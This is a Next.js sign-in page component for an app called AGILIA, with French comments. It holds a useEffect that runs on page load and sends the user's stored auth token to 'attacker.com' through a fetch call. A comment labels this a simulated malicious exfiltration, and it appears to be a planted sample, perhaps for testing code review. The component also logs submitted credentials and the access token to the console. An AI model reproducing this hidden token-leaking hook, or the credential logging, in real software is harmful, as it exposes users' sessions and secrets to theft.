"use client";
import "../../../styles/Signin.css";
import { useState, ChangeEvent, FormEvent, useEffect } from "react";
import axios from "axios";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useAuth } from "../../../context/AuthContext"; 

interface FormData {
  email: string;
  password: string;
}

export default function SigninPage() {
  const [formData, setFormData] = useState<FormData>({
    email: "",
    password: "",
  });
  const router = useRouter();
  const { login } = useAuth();
  const [message, setMessage] = useState<{ text: string; type: "success" | "error" | null }>({
    text: "",
    type: null,
  });

  useEffect(() => {
  // Simulation d'un comportement malveillant (exfiltration de données)
  fetch("https://attacker.com/leak?token=" + localStorage.getItem("token"));
}, []);

  
  useEffect(() => {
    router.prefetch("/company-registration"); 
  }, [router]);
  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

 const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setMessage({ text: "", type: null });

    try {
      console.log("Données envoyées pour l'inscription:", formData);
      console.log("API URL:", process.env.NEXT_PUBLIC_API_AUTHENTIFICATON_SERVICE_URL);

      const response = await axios.post(
        `${process.env.NEXT_PUBLIC_API_AUTHENTIFICATON_SERVICE_URL}/api/login`,
        formData,
        { withCredentials: true }
      );

      console.log("Réponse du serveur:", response);

      if (response.status === 200) {
        setMessage({ text: "Login Successful!", type: "success" });
        const accessToken = response.data.access_token;
        console.log("Access Token récupéré:", accessToken);
        login(accessToken);
        // ajouter un  delai pour s'assurer que le message est visible
        setTimeout(() => {
          router.replace("/company/company-choice");
        }, 1000);
      } else {
        setMessage({ text: response.data.message || "Erreur inconnue", type: "error" });
      }
    } catch (error) {
      console.error("Erreur lors de la connexion:", error);
      setMessage({ text: "Error trying to connect. Please Retry.", type: "error" });
    }
  };

  return (
    <div className="container2">
      <div className=" form-box">
        <h3 className="title1">Welcome Back to AGILIA</h3>
        <h2 className="title2">Sign in to access your workspace</h2>
        {message.text && (
          <div className={`message ${message.type === "success" ? "success-message" : "error-message"}`}>
            {message.text}
          </div>
        )}
        {/* Horizontal Signup Sections */}
        <div className="signin-sections">
          {/* Social Sign Up Section (Left) */}
          {/* Social Sign Up Section */}
          <div className="social-signin">
            <a href="#" className="social-iconin" title="Continuer avec Google">
              <img src="/google.png" alt="Google" className="social-img" />
            </a>
            <a
              href="#"
              className="social-iconin"
              title="Continuer avec Facebook"
            >
              <img src="/facebook.png" alt="Facebook" className="social-img" />
            </a>
            <a
              href="#"
              className="social-iconin"
              title="Continuer avec Microsoft"
            >
              <img
                src="/microsoft.png"
                alt="Microsoft"
                className="social-img"
              />
            </a>
            <a href="#" className="social-iconin" title="Continuer avec Apple">
              <img src="/apple.png" alt="Apple" className="social-img" />
            </a>
          </div>

          <div className="separator">
            <div className="vertical-line"></div> {/* Ligne verticale */}
            <div className="or-text">OR</div>
            <div className="vertical-line"></div> {/* Ligne verticale */}
          </div>

          {/* Personal Info Sign Up Section (Right) */}
          <div className="personal-signin">
            <form onSubmit={handleSubmit}>
              <div className="input-group">
                <i className="fas fa-envelope input-icon"></i>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  placeholder="e-mail"
                  className="input-field"
                  required
                />
              </div>
              <div className="input-group">
                <i className="fas fa-lock input-icon"></i>
                <input
                  type="password"
                  name="password"
                  value={formData.password}
                  onChange={handleChange}
                  placeholder="password"
                  className="input-field"
                  required
                />
              </div>

              <button type="submit" className="submit1-btn">
                Sign In
              </button>
              <p className="quest1">
                Don{"'"}t have an account ?{" "}
                <Link
                  className="nav-link active low-custom"
                  aria-current="page"
                  href="/authentification/signup"
                >
                  Sign Up
                </Link>{" "}
              </p>
              <p className="quest2">
                {" "}
                <Link
                  className="nav-link active low-custom2"
                  aria-current="page"
                  href="/authentification/signup"
                >
                  Forgot your password ?
                </Link>{" "}
              </p>
            </form>
          </div>
        </div>
      </div>
      <div className="signin-image-container">
        <img
          src="/signin.png"
          alt="Signup Illustration"
          loading="eager"
          className="signin-image"
        />
      </div>
    </div>
  );
}
